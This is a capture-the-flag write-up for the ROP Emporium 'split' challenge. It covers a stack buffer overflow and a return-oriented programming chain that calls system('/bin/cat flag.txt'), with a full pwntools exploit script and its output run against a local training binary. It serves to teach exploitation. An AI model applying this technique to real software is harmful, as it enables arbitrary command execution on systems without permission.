# Writeup: split

## Introduction

Here we will be taking advantage of the buffer overflow vulnerability to overwrite the return address of the pwnme function. In this binary there is no "win" function. That is to say there is no function we can jump to that will allow us to obtain the flag. Meaning we need to figure out if there are functions in the binary that we can chain together to obtain the flag.

## Translation of Disassembly

### Main

```
    int main(int argc, char** argv)
    {
            setvbuf(stdout, 0, 2, 0);
            puts("split by ROP Emporium");
            puts("x86_64\n");
            pwnme();
            puts("\nExiting");
            return 0;
    }
```

### pwnme

```
    void pwnme()
    {
            char buffer[32];
            memset(buffer, 0, 32);
            puts("Contriving a reason to ask user for data...");
            printf("> ");
            read(0, buffer, 96);
            puts("Thank you!");

    }
```

### Useful Function

```
    // usefulString address: 0x601060
    const char * usefulString = "/bin/cat flag.txt";

    //usefulFunction address: 0x400742
    void usefulFunction()
    {
            system("/bin/ls");
    }
```

## Analysis

As you can see the binary contains the system function in the usefulFunction and the string "/bin/cat flag.txt" in the global variable usefulString. We can chain these two together to get a call to system with usefulString passed in. To do this we are going to be using pwn tools to find the rop gadgets in the binary. The way we are going to structure the stack after we have overflowed the buffer is going to be like so:

```
    padding ... [ ret instruction for alignment | pop rdi ; ret to pass the first argument | usefulString | address of system call]
```

## Results

Below is the script.

```
    from pwn import *

    p = process('./split')
    e = ELF('./split')

    rop = ROP(e)
    RET = rop.find_gadget(['ret'])[0]
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]

    p.recvuntil(b'> ')
    offset = b'A' * 40
    system = e.sym['system']
    usefulStringAddr = 0x601060

    # first the offset to the place on the stack where the return address is stored then a ret for stack alignment purposes
    # then a pop rdi gadget to pass the first argument into the system function and then the address of the system function

    payload = offset + p64(RET) + p64(POP_RDI) + p64(usefulStringAddr) + p64(system)
    p.sendline(payload)
    p.interactive()
```

Now all that is left is to run the script to obtain the flag.

```
    [+] Starting local process './split': pid 47657
    [*] '/mnt/c/Users/18506/Desktop/CTF/split/split'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    [*] Loaded 14 cached gadgets for './split'
    [*] Switching to interactive mode
    Thank you!
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive
    $
    [*] Process './split' stopped with exit code -11 (SIGSEGV) (pid 47657)
    [*] Got EOF while sending in interactive
```

Finally we have the flag.

`ROPE{a_placeholder_32byte_flag!}`

